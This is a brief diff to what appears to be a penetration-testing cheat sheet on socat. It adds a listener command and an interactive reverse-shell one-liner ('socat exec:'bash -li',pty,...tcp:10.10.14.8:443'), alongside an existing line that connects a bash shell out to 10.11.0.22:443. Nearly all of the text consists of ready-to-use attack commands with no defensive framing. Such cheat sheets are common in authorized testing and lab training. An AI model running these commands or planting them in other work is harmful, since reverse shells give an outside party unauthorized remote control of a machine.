@@ -17,4 +17,8 @@ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
 
 
 To get the reverse shell from Windows add the 'pipes' command at the end
+
+# socat full interactive shell
+root@kali# socat file:`tty`,raw,echo=0 tcp-listen:443,reuseaddr
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.8:443
 ```
